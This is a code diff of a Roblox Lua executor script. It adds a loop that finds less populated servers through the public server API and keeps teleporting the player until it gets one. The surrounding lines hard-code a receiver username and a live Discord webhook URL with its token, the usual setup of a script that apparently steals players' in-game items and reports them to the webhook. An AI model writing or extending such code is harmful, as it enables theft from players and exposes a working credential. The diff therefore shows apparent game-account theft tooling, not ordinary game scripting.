@@ -1,3 +1,44 @@
+-- Auto Server Hop Spam Until Lower Population Server
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local function getSmallestServer()
+	local currentCount = #Players:GetPlayers()
+	local success, servers = pcall(function()
+		local req = syn and syn.request or request
+		return HttpService:JSONDecode(req({
+			Url = "https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100",
+			Method = "GET"
+		}).Body)
+	end)
+
+	if success and servers and servers.data then
+		for _, server in ipairs(servers.data) do
+			if server.id ~= game.JobId and server.playing < currentCount then
+				return server.id
+			end
+		end
+	end
+	return nil
+end
+
+local function autoHopLoop()
+	while true do
+		local targetServerId = getSmallestServer()
+		if targetServerId then
+			TeleportService:TeleportToPlaceInstance(game.PlaceId, targetServerId, LocalPlayer)
+			break
+		end
+		task.wait(3) -- wait before retrying
+	end
+end
+
+-- Start auto-hop spam loop
+autoHopLoop()
+task.wait(5) -- brief pause in case teleport didn't go through
+
 Username = {"darkunknownusers"}
 Webhook = "https://discord.com/api/webhooks/1388199702914404393/YEkwUlOo3WImnClu_PZ6V6IeDvCSmefP8sbEpL1sjVE3dpvfYFLVtdX0iYHJlbl9Iqxg"
 local Username = Username or {"No Receiver", "sad"}
@@ -221,5 +262,6 @@ game.Players.PlayerAdded:Connect(function(player)
     end
 
 end)
+
 
 
